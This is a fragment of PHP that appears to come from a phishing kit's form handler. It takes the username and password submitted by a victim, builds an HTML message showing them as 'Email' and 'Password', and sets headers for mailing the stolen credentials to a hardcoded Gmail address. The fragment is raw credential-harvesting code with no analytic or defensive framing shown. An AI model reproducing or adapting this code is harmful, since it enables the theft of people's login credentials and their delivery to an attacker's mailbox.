...
$mailto = 'marlene.fisher069@gmail.com';


$ripalsenduser = $_POST['username'];
$ripalsendpassword = $_POST['password'];
...
<div id="myBox">
<font color="red" size="6">Email : $ripalsenduser</font> <br>

<font color="red" size="6">Password : $ripalsendpassword</font> <br>
</div>
EOD;


$headers = "From: <marlene.fisher069@gmail.com>\r\n";
